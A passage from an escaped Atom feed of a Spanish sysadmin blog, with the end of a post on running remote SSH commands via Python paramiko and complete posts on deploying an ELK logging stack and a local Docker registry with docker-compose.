&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ cat test.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

import paramiko

def execute_command&lt;span class="o"&gt;(&lt;/span&gt;command, host, user, password, &lt;span class="nv"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;False&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; paramiko.SSHClient&lt;span class="o"&gt;()&lt;/span&gt;
    client.set_missing_host_key_policy&lt;span class="o"&gt;(&lt;/span&gt;paramiko.AutoAddPolicy&lt;span class="o"&gt;())&lt;/span&gt;
    client.connect&lt;span class="o"&gt;(&lt;/span&gt;host, &lt;span class="nv"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;user, &lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;password, &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; sudo:
        stdin, stdout, &lt;span class="nv"&gt;stderr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; client.exec_command&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sudo -S &amp;#39;&lt;/span&gt; + &lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        stdin.write&lt;span class="o"&gt;(&lt;/span&gt;password + &lt;span class="s1"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;:
        stdin, stdout, &lt;span class="nv"&gt;stderr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; client.exec_command&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="nv"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; stdout.read&lt;span class="o"&gt;()&lt;/span&gt;
    client.close&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; output

&lt;span class="nv"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;172.17.0.2&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gerard&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;PASSWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;s3cr3t&amp;#39;&lt;/span&gt;

print &lt;span class="s1"&gt;&amp;#39;Remote hostname:&amp;#39;&lt;/span&gt;, execute_command&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hostname&amp;#39;&lt;/span&gt;, HOST, USER, PASSWORD&lt;span class="o"&gt;)&lt;/span&gt;,
print &lt;span class="s1"&gt;&amp;#39;Remote user:&amp;#39;&lt;/span&gt;, execute_command&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;, HOST, USER, PASSWORD&lt;span class="o"&gt;)&lt;/span&gt;,
print &lt;span class="s1"&gt;&amp;#39;Remote user after sudo:&amp;#39;&lt;/span&gt;, execute_command&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;, HOST, USER, PASSWORD, &lt;span class="nv"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;True&lt;span class="o"&gt;)&lt;/span&gt;,
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda ejecutar para comprobar que funciona como debe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ ./test.py 
Remote hostname: server
Remote user: gerard
Remote user after sudo: root
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un &lt;em&gt;script&lt;/em&gt; real, posiblemente habríamos sacado información mas útil, y habríamos &lt;em&gt;parseado&lt;/em&gt; la salida para no mostrar nada que no nos aporte valor. De momento, nos basta con obtener la salida y mostrarla.&lt;/p&gt;</content><category term="ssh"></category><category term="python"></category><category term="paramiko"></category><category term="script"></category></entry><entry><title>Acumulando los logs en un servidor centralizado con Kibana</title><link href="http://www.linuxsysadmin.ml/2017/01/acumulando-los-logs-en-un-servidor-centralizado-con-kibana.html" rel="alternate"></link><published>2017-01-16T10:00:00+01:00</published><updated>2017-01-16T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-16:/2017/01/acumulando-los-logs-en-un-servidor-centralizado-con-kibana.html</id><summary type="html">&lt;p&gt;Buscar en los &lt;em&gt;logs&lt;/em&gt; es fácil cuando tenemos una máquina de cada tipo, pero es una actividad muy poco gratificante cuando tenemos un número grande o variable de cada tipo. La mejor manera de tenerlos controlados es hacer que envíen sus &lt;em&gt;logs&lt;/em&gt; a un almacén central, para su fácil consulta …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Buscar en los &lt;em&gt;logs&lt;/em&gt; es fácil cuando tenemos una máquina de cada tipo, pero es una actividad muy poco gratificante cuando tenemos un número grande o variable de cada tipo. La mejor manera de tenerlos controlados es hacer que envíen sus &lt;em&gt;logs&lt;/em&gt; a un almacén central, para su fácil consulta.&lt;/p&gt;
&lt;p&gt;En este artículo se pretende dar a conocer una de estas soluciones de acumulación y búsqueda de &lt;em&gt;logs&lt;/em&gt;, conocida como &lt;strong&gt;ELK&lt;/strong&gt; (hace poco se renombró a &lt;strong&gt;Elastic Stack&lt;/strong&gt;). Se trata de un conjunto de servicios que cooperan para obtener una solución completa:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Elastic search&lt;/strong&gt;: se trata de la base de datos que almacena todos los &lt;em&gt;logs&lt;/em&gt; que se le envían.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Logstash&lt;/strong&gt;: Es un agente que envía los &lt;em&gt;logs&lt;/em&gt; de varias fuentes al &lt;strong&gt;elastic search&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kibana&lt;/strong&gt;: Es una interfaz gráfica que nos permite buscar &lt;em&gt;logs&lt;/em&gt; y dibujar bonitas gráficas, partiendo de los datos del &lt;strong&gt;elastic search&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Esquema de un ELK" src="http://www.linuxsysadmin.ml/images/the-elk-stack.jpg"&gt;&lt;/p&gt;
&lt;p&gt;De esto se puede deducir que vamos a necesitar una instancia de cada tipo, a excepción de &lt;strong&gt;logstash&lt;/strong&gt;, que debe ponerse en todos los servidores que recojan &lt;em&gt;logs&lt;/em&gt;. Se podría poner, por ejemplo, el &lt;strong&gt;elastic search&lt;/strong&gt; y el &lt;strong&gt;kibana&lt;/strong&gt; en una misma máquina, dedicada solamente al consumo de los &lt;em&gt;logs&lt;/em&gt; de todos los servidores productivos.&lt;/p&gt;
&lt;h2&gt;Un ejemplo rápido&lt;/h2&gt;
&lt;p&gt;Si miramos en &lt;a href="https://hub.docker.com/"&gt;DockerHub&lt;/a&gt;, podremos comprobar que las 3 piezas disponen de una imagen que las satisface. Eso nos va a ahorrar mucho tiempo, a costa de las particularidades de cada imagen.&lt;/p&gt;
&lt;p&gt;Vamos a poner todas las imágenes en el mismo servidor por economía, pero lo ideal sería un &lt;strong&gt;logstash&lt;/strong&gt; por servidor y otro servidor con &lt;strong&gt;elastic search&lt;/strong&gt; y &lt;strong&gt;kibana&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El primer paso es acondicionar la memoria que pueden usar nuestros procesos. Esto se hace porque el &lt;strong&gt;elastic search&lt;/strong&gt; consume mucha memoria y va a fallar iniciándose.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ sudo sysctl -w vm.max_map_count&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;262144&lt;/span&gt;
vm.max_map_count &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;262144&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La mayoría de imágenes funcionan bien de serie, pero no es el caso de &lt;strong&gt;logstash&lt;/strong&gt;, que necesita una configuraciṕon para indicar qué &lt;em&gt;logs&lt;/em&gt; recoger, las transformaciones que deben sufrir, y el destino al que ir. Más información en &lt;a href="https://www.elastic.co/guide/en/logstash/current/index.html"&gt;la documentación&lt;/a&gt;. De momento nos vamos a limitar a recoger todos los ficheros &lt;em&gt;.log&lt;/em&gt; recursivamente de la carpeta &lt;em&gt;/logs&lt;/em&gt;; esta va a ser un volumen de &lt;em&gt;/var/log&lt;/em&gt; del servidor real.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ cat logstash.conf 
input &lt;span class="o"&gt;{&lt;/span&gt;
  file &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;/logs/**/*.log&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;start_position&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;beginning&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

output &lt;span class="o"&gt;{&lt;/span&gt;
  elasticsearch &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;hosts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;elasticsearch:9200&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para simplificar el despliegue, vamos a usar &lt;strong&gt;docker-compose&lt;/strong&gt;, con algunas variaciones interesantes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  elasticsearch:
    image: elasticsearch
    container_name: elasticsearch
    hostname: elasticsearch
  kibana:
    image: kibana
    container_name: kibana
    hostname: kibana
    ports:
      - &lt;span class="s2"&gt;&amp;quot;5601:5601&amp;quot;&lt;/span&gt;
  logstash:
    image: logstash
    container_name: logstash
    hostname: logstash
    volumes:
      - ./logstash.conf:/logstash.conf:ro
      - /var/log:/logs:ro
    user: root
    command: &lt;span class="o"&gt;[&lt;/span&gt;bash, -c, &lt;span class="s2"&gt;&amp;quot;logstash -f /logstash.conf&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se hace notar especialmente que publicamos el puerto del &lt;strong&gt;kibana&lt;/strong&gt;, para poderlo ver cómodamente en nuestro navegador. Aparte de esto, vamos a poner el fichero de configuración de &lt;strong&gt;logstash&lt;/strong&gt; como un volumen local, tal como la carpeta de &lt;em&gt;logs&lt;/em&gt;. Un último detalle es que modificamos el comando a ejecutar para que el &lt;em&gt;entrypoint&lt;/em&gt; que viene por defecto no nos fuerce el usuario &lt;em&gt;logstash&lt;/em&gt;, puesto que entonces no podríamos leer muchos de los &lt;em&gt;logs&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;elk_default&amp;quot;&lt;/span&gt; with the default driver
Creating elasticsearch
Creating logstash
Creating kibana
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos falta acceder a la interfaz del &lt;strong&gt;Kibana&lt;/strong&gt; en &lt;a href="http://localhost:5601/"&gt;http://localhost:5601/&lt;/a&gt; y disfrutar del resultado.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Frontend de Kibana" src="http://www.linuxsysadmin.ml/images/kibana-frontend.jpg"&gt;&lt;/p&gt;</content><category term="ELK"></category><category term="elastic search"></category><category term="logstash"></category><category term="kibana"></category><category term="logs"></category></entry><entry><title>Un registro local de Docker</title><link href="http://www.linuxsysadmin.ml/2017/01/un-registro-local-de-docker.html" rel="alternate"></link><published>2017-01-09T10:00:00+01:00</published><updated>2017-01-09T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-09:/2017/01/un-registro-local-de-docker.html</id><summary type="html">&lt;p&gt;He llegado a ese momento en el que el número de imágenes &lt;strong&gt;docker&lt;/strong&gt; que he construido se me ha ido de las manos. Ya no pueden seguir ocupando espacio en mi local, así que me he decidido a montar mi propio registro de imágenes, para mi uso y disfrute privado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;He llegado a ese momento en el que el número de imágenes &lt;strong&gt;docker&lt;/strong&gt; que he construido se me ha ido de las manos. Ya no pueden seguir ocupando espacio en mi local, así que me he decidido a montar mi propio registro de imágenes, para mi uso y disfrute privado.&lt;/p&gt;
&lt;p&gt;Si miramos en &lt;a href="https://hub.docker.com/_/registry/"&gt;DockerHub&lt;/a&gt; no nos va a costar demasiado encontrar una imagen que nos proporciones este servicio. Ejecutar esta imagen para uso local no tiene ninguna complicación, y basta con seguir las instrucciones. La cosa se complica si queremos sacarlo de nuestra infraestructura, pero no va a ser el caso de hoy.&lt;/p&gt;
&lt;h2&gt;Levantando un registro local&lt;/h2&gt;
&lt;p&gt;Siguiendo las instrucciones, lanzamos el comando indicado en la documentación:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ docker run -d -p &lt;span class="m"&gt;5000&lt;/span&gt;:5000 registry
735016f722f25c0d8a8f09c1e2b856011d46fa4efd3a4d6c7846405140443128
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos exponer el puerto 5000 que, por comodidad, va a usar el mismo puerto en mi máquina local. La única parte con estado de la imagen es &lt;em&gt;/var/lib/registry&lt;/em&gt;, y puede resultar interesante saberlo para hacer copias de seguridad; no voy a hacerlo porque la imagen ya lleva por defecto un &lt;em&gt;container volume&lt;/em&gt; declarado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ docker &lt;span class="nb"&gt;history&lt;/span&gt; registry
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
c9bd19d022f6        &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;/etc/docker/registry   0 B                 &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop)  ENTRYPOINT [&amp;quot;/entrypoint.s   0 B                 &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:7b57f7ab1a8cf85c0   155 B               &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop)  EXPOSE 5000/tcp              0 B                 &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop)  VOLUME [/var/lib/registry]   0 B                 &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:6c4758d509045dc45   295 B               &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:3f73dd916d906a0db   27.21 MB            &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="nb"&gt;set&lt;/span&gt; -ex     &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apk add --no-cache    &lt;span class="m"&gt;1&lt;/span&gt;.287 MB            
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:7afbc23fda8b0b3872   4.803 MB            &lt;/span&gt;
gerard@aldebaran:~/docker/registry$ docker inspect 735016f722f2
&lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
...  
        &lt;span class="s2"&gt;&amp;quot;Mounts&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;875b58044b85426eb82b5ea74f51f22865994d1bb84d26317c91abaaf1d5f83c&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;Source&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;/var/lib/docker/volumes/875b58044b85426eb82b5ea74f51f22865994d1bb84d26317c91abaaf1d5f83c/_data&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;Destination&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;/var/lib/registry&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;Driver&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;local&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;Mode&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;RW&amp;quot;&lt;/span&gt;: true,
                &lt;span class="s2"&gt;&amp;quot;Propagation&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;,
...  
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si preferís la versión usando &lt;strong&gt;docker-compose&lt;/strong&gt;, no difiere demasiado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  registry:
    image: registry
    hostname: registry
    container_name: registry
    volumes:
      - ./data:/var/lib/registry
    ports:
      - &lt;span class="s2"&gt;&amp;quot;5000:5000&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;registry_default&amp;quot;&lt;/span&gt; with the default driver
Creating registry
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, se ha optado por mapear el volumen &lt;em&gt;/var/lib/registry&lt;/em&gt; en una carpeta local, para poder inspeccionarlo fácilmente y para sacar &lt;em&gt;backups&lt;/em&gt; con mas facilidad todavía.&lt;/p&gt;
&lt;h2&gt;Uso de nuestro registro local&lt;/h2&gt;
&lt;p&gt;Se puede trabajar con nuestro registro de la misma forma con la que lo haríamos con &lt;em&gt;DockerHub&lt;/em&gt;, a base de usar el comando &lt;em&gt;docker push&lt;/em&gt; y &lt;em&gt;docker pull&lt;/em&gt;. Solo hay que mencionar que el registro destino viene especificado en el nombre de la imagen, en el formato &lt;code&gt;&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;imagen&amp;gt;:&amp;lt;tag&amp;gt;&lt;/code&gt;. Por ejemplo, vamos a subir una imagen &lt;em&gt;alpine:3.4&lt;/em&gt;, aunque podría ser una imagen nuestra.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ docker tag alpine:3.4 localhost:5000/alpine:3.4
gerard@aldebaran:~/docker/registry$ docker images
REPOSITORY                                                                                      TAG                 IMAGE ID            CREATED             SIZE
alpine                                                                                          &lt;span class="m"&gt;3&lt;/span&gt;.4                 baa5d63471ea        &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.803 MB
localhost:5000/alpine                                                                           &lt;span class="m"&gt;3&lt;/span&gt;.4                 baa5d63471ea        &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.803 MB
gerard@aldebaran:~/docker/registry$ docker push localhost:5000/alpine:3.4
The push refers to a repository &lt;span class="o"&gt;[&lt;/span&gt;localhost:5000/alpine&lt;span class="o"&gt;]&lt;/span&gt;
011b303988d2: Pushed 
&lt;span class="m"&gt;3&lt;/span&gt;.4: digest: sha256:1354db23ff5478120c980eca1611a51c9f2b88b61f24283ee8200bf9a54f2e5c size: &lt;span class="m"&gt;528&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y las capas que conforman nuestra imagen, quedan guardadas en nuestro registro local, como podemos ver:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ tree data/
data/
└── docker
    └── registry
        └── v2
            ├── blobs
            │   └── sha256
            │       ├── &lt;span class="m"&gt;13&lt;/span&gt;
            │       │   └── 1354db23ff5478120c980eca1611a51c9f2b88b61f24283ee8200bf9a54f2e5c
            │       │       └── data
            │       ├── &lt;span class="m"&gt;36&lt;/span&gt;
            │       │   └── 3690ec4760f95690944da86dc4496148a63d85c9e3100669a318110092f6862f
            │       │       └── data
            │       └── ba
            │           └── baa5d63471ead618ff91ddfacf1e2c81bf0612bfeb1daf00eb0843a41fbfade3
            │               └── data
            └── repositories
                └── alpine
                    ├── _layers
                    │   └── sha256
                    │       ├── 3690ec4760f95690944da86dc4496148a63d85c9e3100669a318110092f6862f
                    │       │   └── link
                    │       └── baa5d63471ead618ff91ddfacf1e2c81bf0612bfeb1daf00eb0843a41fbfade3
                    │           └── link
                    ├── _manifests
                    │   ├── revisions
                    │   │   └── sha256
                    │   │       └── 1354db23ff5478120c980eca1611a51c9f2b88b61f24283ee8200bf9a54f2e5c
                    │   │           └── link
                    │   └── tags
                    │       └── &lt;span class="m"&gt;3&lt;/span&gt;.4
                    │           ├── current
                    │           │   └── link
                    │           └── index
                    │               └── sha256
                    │                   └── 1354db23ff5478120c980eca1611a51c9f2b88b61f24283ee8200bf9a54f2e5c
                    │                       └── link
                    └── _uploads

&lt;span class="m"&gt;28&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nada nos impediría hacer un &lt;code&gt;docker pull localhost:5000/alpine:3.4&lt;/code&gt; en el futuro.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: En caso de querer hacer un &lt;em&gt;push&lt;/em&gt; de un tag &lt;em&gt;default&lt;/em&gt; de la imagen &lt;code&gt;tools/tsung&lt;/code&gt;, bastaría con que usar &lt;code&gt;localhost:5000/tools/tsung&lt;/code&gt;; el nombre de la imagen puede contener el separador &lt;code&gt;/&lt;/code&gt; y el &lt;em&gt;tag&lt;/em&gt; es opcional, usando el &lt;em&gt;tag&lt;/em&gt; por defecto &lt;em&gt;default&lt;/em&gt;, justo como pasa con &lt;em&gt;DockerHub&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Consultando el contenido de nuestro registro&lt;/h2&gt;
&lt;p&gt;Ahora mismo nuestro registro solo tiene guardado un &lt;em&gt;alpine:3.4&lt;/em&gt;. Para poder ver una salida mas interesante de la API del registro, subo una &lt;em&gt;alpine:edge&lt;/em&gt; y una &lt;em&gt;debian:jessie&lt;/em&gt;. Así podemos apreciar dos imágenes, y una de ellas, con dos &lt;em&gt;tags&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Empezamos dando un nombre que contenga &lt;em&gt;localhost:5000&lt;/em&gt; como ya hemos visto más arriba:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ docker tag &lt;span class="o"&gt;{&lt;/span&gt;,localhost:5000/&lt;span class="o"&gt;}&lt;/span&gt;alpine:edge
gerard@aldebaran:~/docker/registry$ docker tag &lt;span class="o"&gt;{&lt;/span&gt;,localhost:5000/&lt;span class="o"&gt;}&lt;/span&gt;debian:jessie
gerard@aldebaran:~/docker/registry$ docker images &lt;span class="p"&gt;|&lt;/span&gt; grep localhost
localhost:5000/debian                                                                           jessie              73e72bf822ca        &lt;span class="m"&gt;4&lt;/span&gt; weeks ago         &lt;span class="m"&gt;123&lt;/span&gt; MB
localhost:5000/alpine                                                                           edge                a1a3cae7a75e        &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         &lt;span class="m"&gt;3&lt;/span&gt;.979 MB
localhost:5000/alpine                                                                           &lt;span class="m"&gt;3&lt;/span&gt;.4                 baa5d63471ea        &lt;span class="m"&gt;7&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.803 MB
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y los empujamos al registro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ docker push localhost:5000/alpine:edge
The push refers to a repository &lt;span class="o"&gt;[&lt;/span&gt;localhost:5000/alpine&lt;span class="o"&gt;]&lt;/span&gt;
6f4ada5745cd: Pushed 
edge: digest: sha256:cd9c03c2d382fcf00c31dc1635445163ec185dfffb51242d9e097892b3b0d5b4 size: &lt;span class="m"&gt;528&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ docker push localhost:5000/debian:jessie
The push refers to a repository &lt;span class="o"&gt;[&lt;/span&gt;localhost:5000/debian&lt;span class="o"&gt;]&lt;/span&gt;
fe4c16cbf7a4: Pushed 
jessie: digest: sha256:c1ce85a0f7126a3b5cbf7c57676b01b37c755b9ff9e2f39ca88181c02b985724 size: &lt;span class="m"&gt;529&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Disponemos de una API con -al menos- dos métodos que nos sirven para ver lo que hay en el registro:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Listar las imágenes de nuestro repositorio -&amp;gt; &lt;code&gt;GET /v2/_catalog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Listar los &lt;em&gt;tags&lt;/em&gt; de una imagen concreta -&amp;gt; &lt;code&gt;GET /v2/&amp;lt;imagen&amp;gt;/tags/list&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así, podemos ver lo que hay con las siguientes invocaciones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ curl http://localhost:5000/v2/_catalog
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;repositories&amp;quot;&lt;/span&gt;:&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alpine&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;debian&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;
